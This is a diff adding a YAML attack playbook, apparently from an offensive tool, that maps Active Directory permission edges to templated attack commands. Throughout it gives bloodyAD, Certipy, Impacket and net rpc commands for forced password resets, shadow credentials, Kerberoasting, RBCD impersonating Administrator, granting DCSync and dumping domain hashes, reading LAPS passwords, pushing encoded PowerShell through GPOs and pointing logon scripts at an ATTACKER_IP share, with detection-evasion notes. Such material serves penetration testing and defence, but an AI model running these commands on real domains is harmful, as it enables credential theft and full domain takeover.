@@ -1,0 +1,301 @@
+# ACL Abuse Commands
+# Edge types: GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, AddMember, AllExtendedRights, Owns
+
+GenericAll:
+  User:
+    description: "Full control over user - change password or add shadow credentials"
+    commands:
+      - name: "Force password change"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set password <TARGET> '<NEW_PASSWORD>'
+      - name: "Shadow Credentials attack"
+        tool: Certipy
+        command: |
+          certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account <TARGET>
+      - name: "Targeted Kerberoasting (set SPN)"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> servicePrincipalName -v 'HTTP/<TARGET>'
+          GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+    opsec:
+      - "Password change creates Event ID 4724"
+      - "Shadow credentials modifies msDS-KeyCredentialLink"
+      - "SPN modification creates Event ID 5136"
+
+  Computer:
+    description: "Full control over computer - RBCD or shadow credentials"
+    commands:
+      - name: "Resource-Based Constrained Delegation"
+        tool: Impacket
+        command: |
+          rbcd.py -delegate-to '<TARGET>$' -delegate-from '<CONTROLLED_ACCOUNT>$' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+          getST.py -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<CONTROLLED_ACCOUNT>$:<HASH>'
+          secretsdump.py -k -no-pass <TARGET_FQDN>
+      - name: "Shadow Credentials attack"
+        tool: Certipy
+        command: |
+          certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET>$'
+    opsec:
+      - "RBCD modifies msDS-AllowedToActOnBehalfOfOtherIdentity"
+      - "Shadow credentials modifies msDS-KeyCredentialLink"
+
+  Group:
+    description: "Full control over group - add yourself as member"
+    commands:
+      - name: "Add to group"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember <TARGET> <ATTACKER_USER>
+      - name: "Add to group (net rpc)"
+        tool: net
+        command: |
+          net rpc group addmem '<TARGET>' '<ATTACKER_USER>' -U '<DOMAIN>/<USERNAME>%<PASSWORD>' -S <DC_IP>
+    opsec:
+      - "Group membership change creates Event ID 4728/4732/4756"
+
+  GPO:
+    description: "Full control over GPO - add malicious settings"
+    commands:
+      - name: "Add immediate scheduled task"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<GPO_ID>' -command 'powershell.exe -enc <PAYLOAD>' -f
+    opsec:
+      - "GPO changes replicate to all DCs"
+      - "Scheduled tasks visible in Task Scheduler"
+
+GenericWrite:
+  User:
+    description: "Write properties - targeted Kerberoasting or logon script"
+    commands:
+      - name: "Targeted Kerberoasting (set SPN)"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> servicePrincipalName -v 'HTTP/<TARGET>'
+          GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+      - name: "Set logon script"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> scriptPath -v '\\<ATTACKER_IP>\share\script.bat'
+    opsec:
+      - "SPN modification creates Event ID 5136"
+      - "Logon script executes at next user logon"
+
+  Computer:
+    description: "Write properties - RBCD attack"
+    commands:
+      - name: "Resource-Based Constrained Delegation"
+        tool: Impacket
+        command: |
+          rbcd.py -delegate-to '<TARGET>$' -delegate-from '<CONTROLLED_ACCOUNT>$' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+          getST.py -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<CONTROLLED_ACCOUNT>$:<HASH>'
+    opsec:
+      - "RBCD modifies msDS-AllowedToActOnBehalfOfOtherIdentity"
+
+  Group:
+    description: "Write properties - limited group abuse"
+    commands:
+      - name: "Modify group properties"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object '<TARGET>' description -v 'Pwned'
+    opsec:
+      - "Property changes create Event ID 5136"
+
+WriteDacl:
+  User:
+    description: "Modify ACL - grant yourself GenericAll"
+    commands:
+      - name: "Grant GenericAll to yourself"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+      - name: "Grant GenericAll (dacledit)"
+        tool: Impacket
+        command: |
+          dacledit.py -action write -rights FullControl -principal '<ATTACKER_USER>' -target '<TARGET>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+      - "Can be detected by ACL auditing"
+
+  Computer:
+    description: "Modify ACL - grant yourself GenericAll for RBCD"
+    commands:
+      - name: "Grant GenericAll to yourself"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>$' '<ATTACKER_USER>'
+      - name: "Then perform RBCD attack"
+        tool: Impacket
+        command: |
+          rbcd.py -delegate-to '<TARGET>$' -delegate-from '<CONTROLLED_ACCOUNT>$' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+
+  Group:
+    description: "Modify ACL - grant yourself AddMember"
+    commands:
+      - name: "Grant AddMember to yourself"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add addMember '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+
+  Domain:
+    description: "Modify domain ACL - grant DCSync rights"
+    commands:
+      - name: "Grant DCSync rights"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add dcsync '<ATTACKER_USER>'
+      - name: "DCSync the domain"
+        tool: Impacket
+        command: |
+          secretsdump.py '<DOMAIN>/<ATTACKER_USER>:<PASSWORD>'@<DC_IP>
+    opsec:
+      - "DCSync creates Event ID 4662 with specific GUIDs"
+      - "Highly visible attack"
+
+WriteOwner:
+  User:
+    description: "Take ownership then modify ACL"
+    commands:
+      - name: "Take ownership and grant GenericAll"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "Ownership change creates Event ID 5136"
+
+  Computer:
+    description: "Take ownership then modify ACL for RBCD"
+    commands:
+      - name: "Take ownership and grant GenericAll"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>$' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>$' '<ATTACKER_USER>'
+    opsec:
+      - "Ownership change creates Event ID 5136"
+
+  Group:
+    description: "Take ownership then add yourself"
+    commands:
+      - name: "Take ownership and grant AddMember"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add addMember '<TARGET>' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "Ownership change creates Event ID 5136"
+
+ForceChangePassword:
+  User:
+    description: "Reset user password without knowing current password"
+    commands:
+      - name: "Force password change"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set password <TARGET> '<NEW_PASSWORD>'
+      - name: "Force password change (net rpc)"
+        tool: net
+        command: |
+          net rpc password '<TARGET>' '<NEW_PASSWORD>' -U '<DOMAIN>/<USERNAME>%<PASSWORD>' -S <DC_IP>
+      - name: "Force password change (rpcclient)"
+        tool: rpcclient
+        command: |
+          rpcclient -U '<DOMAIN>/<USERNAME>%<PASSWORD>' <DC_IP> -c "setuserinfo2 <TARGET> 23 '<NEW_PASSWORD>'"
+    opsec:
+      - "Password change creates Event ID 4724"
+      - "User will notice password change on next login"
+
+AddMember:
+  Group:
+    description: "Add members to group"
+    commands:
+      - name: "Add yourself to group"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember '<TARGET>' '<ATTACKER_USER>'
+      - name: "Add to group (net rpc)"
+        tool: net
+        command: |
+          net rpc group addmem '<TARGET>' '<ATTACKER_USER>' -U '<DOMAIN>/<USERNAME>%<PASSWORD>' -S <DC_IP>
+    opsec:
+      - "Group membership change creates Event ID 4728/4732/4756"
+
+AllExtendedRights:
+  User:
+    description: "All extended rights - force password change or read LAPS"
+    commands:
+      - name: "Force password change"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set password <TARGET> '<NEW_PASSWORD>'
+    opsec:
+      - "Password change creates Event ID 4724"
+
+  Computer:
+    description: "All extended rights - read LAPS password"
+    commands:
+      - name: "Read LAPS password"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr ms-mcs-AdmPwd
+      - name: "Read LAPS password (ldapsearch)"
+        tool: ldapsearch
+        command: |
+          ldapsearch -x -H ldap://<DC_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(name=<TARGET>)' ms-mcs-AdmPwd
+    opsec:
+      - "LAPS password read may be logged depending on configuration"
+
+  Domain:
+    description: "All extended rights on domain - DCSync"
+    commands:
+      - name: "DCSync attack"
+        tool: Impacket
+        command: |
+          secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
+      - name: "DCSync specific user"
+        tool: Impacket
+        command: |
+          secretsdump.py -just-dc-user Administrator '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
+    opsec:
+      - "DCSync creates Event ID 4662 with specific GUIDs"
+      - "Highly visible, requires GetChanges and GetChangesAll"
+
+Owns:
+  User:
+    description: "Owner of user - modify ACL to gain full control"
+    commands:
+      - name: "Grant yourself GenericAll"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+
+  Computer:
+    description: "Owner of computer - modify ACL for RBCD"
+    commands:
+      - name: "Grant yourself GenericAll then RBCD"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>$' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+
+  Group:
+    description: "Owner of group - modify ACL to add members"
+    commands:
+      - name: "Grant yourself AddMember"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add addMember '<TARGET>' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
